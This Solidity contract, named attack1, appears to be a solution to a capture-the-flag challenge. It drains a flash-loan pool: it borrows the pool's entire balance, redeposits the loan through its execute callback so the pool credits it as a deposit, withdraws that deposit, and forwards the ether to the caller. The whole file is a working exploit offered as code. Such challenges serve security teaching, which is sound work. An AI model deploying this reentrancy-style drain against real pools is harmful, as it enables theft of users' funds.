// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

//can probably implement our own code, as we never initialize the interface 
interface Pool {
     function deposit() external payable;
     function withdraw() external;
     function flashLoan(uint256 amount) external;
}

contract attack1{
    Pool pool;
    address player;

    constructor(address pooladd, address _player){
        pool = Pool(pooladd);
        player = _player;

    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool sent, bytes memory data) = msg.sender.call{value: address(this).balance}("");

    }


    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    receive() external payable{}
}
